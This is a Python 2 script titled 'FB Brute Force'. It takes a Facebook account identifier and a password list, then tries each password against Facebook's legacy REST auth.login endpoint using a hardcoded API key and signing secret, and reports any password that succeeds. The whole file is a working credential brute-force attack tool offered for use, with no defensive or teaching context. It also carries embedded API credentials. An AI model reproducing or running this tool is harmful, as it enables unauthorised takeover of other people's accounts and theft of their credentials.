import os
import sys
import urllib
import hashlib
os.system("clear")
print("\033[0;32m"+"" "")
API_SECRET = "62f8ce9f74b12f84c123cc23437a4a32"

__banner__ = """
 ######         #     #   #   #          #     #   #   #     # #              
 #     # ###### #     #  ##   #          ##    #  ##   #     # #    #  #####  
 #     # #      #     # # #   #          # #   # # #   #     # #    #  #    # 
 #     # #####  #     #   #   #          #  #  #   #   ####### #    #  #    # 
 #     # #       #   #    #   #          #   # #   #   #     # ####### #    # 
 #     # #        # #     #   #          #    ##   #   #     #      #  #    # 
 ######  ######    #    ##### #######    #     # ##### #     #      #  #####  
                                                                              
"""

print("\033[0;32m"+"""
 _______ _        ______                           _______                    
(_______) |      (____  \             _           (_______)                   
 _____  | | _     ____)  ) ____ _   _| |_  ____    _____ ___   ____ ____ ____ 
|  ___) | || \   |  __  ( / ___) | | |  _)/ _  )  |  ___) _ \ / ___) ___) _  )
| |     | |_) )  | |__)  ) |   | |_| | |_( (/ /   | |  | |_| | |  ( (__( (/ / 
|_|     |____/   |______/|_|    \____|\___)____)  |_|   \___/|_|   \____)____)
                                                                              
""")
userid = raw_input("[*] Enter [Email|Phone|Username|ID]:")
try:
	passlist = raw_input("[*] Set PATH to passlist: ")
	if os.path.exists(passlist) != False:
		print("\033[0;35m"+__banner__)
		print(" [+] Account to crack : {}".format(userid))
		print(" [+] Loaded : {}".format(len(open(passlist,"r").read().split("\n"))))
		print(" [+] Cracking, please wait ...")
		for passwd in open(passlist,'r').readlines():
			sys.stdout.write(u"\u001b[1000D[*] Trying {}".format(passwd.strip()))
			sys.stdout.flush()
			sig = "api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail={}format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword={}return_ssl_resources=0v=1.0{}".format(userid,passwd.strip(),API_SECRET)
			xx = hashlib.md5(sig).hexdigest()
			data = "api_key=882a8490361da98702bf97a021ddc14d&credentials_type=password&email={}&format=JSON&generate_machine_id=1&generate_session_cookies=1&locale=en_US&method=auth.login&password={}&return_ssl_resources=0&v=1.0&sig={}".format(userid,passwd.strip(),xx)
			response = urllib.urlopen("https://api.facebook.com/restserver.php?{}".format(data)).read()
			if "error" in response:
				pass
			else:
				print("\n\n[+] Password found .. !!")
				print("\n[+] Password : {}".format(passwd.strip()))
				break
		print("\n\n[!] Done .. !!")
	else:
		print("fbbrute: error: No such file or directory")
except KeyboardInterrupt:
	print("fbbrute: error: Keyboard interrupt")